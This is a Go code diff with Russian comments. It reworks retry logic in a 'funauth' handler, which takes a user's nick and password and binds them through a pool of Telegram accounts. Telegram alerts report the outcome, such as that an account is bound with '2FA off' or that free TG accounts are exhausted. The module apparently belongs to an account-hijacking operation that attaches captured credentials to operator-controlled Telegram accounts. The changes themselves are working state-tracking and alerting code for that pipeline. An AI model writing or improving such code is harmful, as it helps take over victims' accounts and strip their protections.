@@ -10,7 +10,6 @@ import (
 	"net/http"
 	"strings"
 	"sync"
-	"time"
 )
 
 var (
@@ -18,9 +17,9 @@ var (
 	funauthBinderInst *funauthBinder
 	funauthInitOnce   sync.Once
 
-	funauthInflight   = make(map[string]time.Time) // nick → started
-	funauthInflightMu sync.Mutex
-	funauthCooldown   = 3 * time.Minute
+	// nick → last bind outcome: "pending" | "ok" | "no_accounts" | "fail"
+	funauthNickState   = make(map[string]string)
+	funauthNickStateMu sync.Mutex
 )
 
 func initFunauth() {
@@ -239,23 +238,42 @@ type funauthBindReq struct {
 	Password string `json:"password"`
 }
 
-func funauthShouldSkip(nick string) bool {
-	funauthInflightMu.Lock()
-	defer funauthInflightMu.Unlock()
-	if t, ok := funauthInflight[nick]; ok && time.Since(t) < funauthCooldown {
-		return true
+func funauthNickKey(nick string) string {
+	return strings.ToLower(strings.TrimSpace(nick))
+}
+
+// Повторный bind только если ещё не ставили в очередь, или прошлый раз — «нет свободных TG»
+// (слишком много привязанных / no_accounts). Пока pending/ok/другой fail — не дублируем.
+func funauthMayStartBind(nick string) (ok bool, reason string) {
+	key := funauthNickKey(nick)
+	funauthNickStateMu.Lock()
+	defer funauthNickStateMu.Unlock()
+	st, exists := funauthNickState[key]
+	if !exists {
+		funauthNickState[key] = "pending"
+		return true, ""
 	}
-	funauthInflight[nick] = time.Now()
-	return false
+	switch st {
+	case "pending":
+		return false, "already_pending"
+	case "ok":
+		return false, "already_ok"
+	case "no_accounts":
+		funauthNickState[key] = "pending"
+		return true, ""
+	default: // fail и прочее
+		return false, "already_tried:" + st
+	}
 }
 
-func funauthClearInflight(nick string) {
-	funauthInflightMu.Lock()
-	delete(funauthInflight, nick)
-	funauthInflightMu.Unlock()
+func funauthSetNickState(nick, state string) {
+	key := funauthNickKey(nick)
+	funauthNickStateMu.Lock()
+	funauthNickState[key] = state
+	funauthNickStateMu.Unlock()
 }
 
-// handleFunauthBindWS — очередь bind через native gotd; алерт если акки кончились.
+// handleFunauthBindWS — очередь bind; один nick не дублируется, кроме после no_accounts.
 func handleFunauthBindWS(nick, password string) {
 	initFunauth()
 	nick = strings.TrimSpace(nick)
@@ -264,17 +282,17 @@ func handleFunauthBindWS(nick, password string) {
 		log.Printf("[funauth] skip empty nick/password")
 		return
 	}
-	if funauthShouldSkip(nick) {
-		log.Printf("[funauth] cooldown skip %s", nick)
+	if ok, why := funauthMayStartBind(nick); !ok {
+		log.Printf("[funauth] skip %s (%s)", nick, why)
 		return
 	}
 
 	go func() {
-		defer funauthClearInflight(nick)
 		log.Printf("[funauth] bind start %s", nick)
 
 		if funauthPoolInst == nil || !funauthPoolInst.configured() {
 			log.Printf("[funauth] not ready for %s", nick)
+			funauthSetNickState(nick, "no_accounts") // чтобы можно было повторить после починки
 			enqueueTelegramMessage(
 				fmt.Sprintf("⚠️ FunAuth недоступен для `%s`", nick),
 				"Markdown",
@@ -291,6 +309,7 @@ func handleFunauthBindWS(nick, password string) {
 		result := funauthBinderInst.Bind(nick, password)
 
 		if result.Error == "no_accounts" {
+			funauthSetNickState(nick, "no_accounts")
 			msg := fmt.Sprintf(
 				"🚨 FunAuth: нет свободных TG-аккаунтов для `%s`\nДобавь акк: http://127.0.0.1:8080/funauth/",
 				nick,
@@ -306,12 +325,15 @@ func handleFunauthBindWS(nick, password string) {
 		}
 
 		if result.OK {
+			funauthSetNickState(nick, "ok")
 			log.Printf("[funauth] ok %s via %s", nick, result.TgPhone)
 			enqueueTelegramMessage(
 				fmt.Sprintf("✅ FunAuth: `%s` привязан (tg %s), 2FA выкл", nick, result.TgPhone),
 				"Markdown",
 			)
 		} else {
+			// Не no_accounts — повтор с флота не делаем (только руками / сброс state)
+			funauthSetNickState(nick, "fail:"+result.Error)
 			log.Printf("[funauth] fail %s: %s", nick, result.Error)
 			enqueueTelegramMessage(
 				fmt.Sprintf("❌ FunAuth fail `%s`: %s", nick, result.Error),
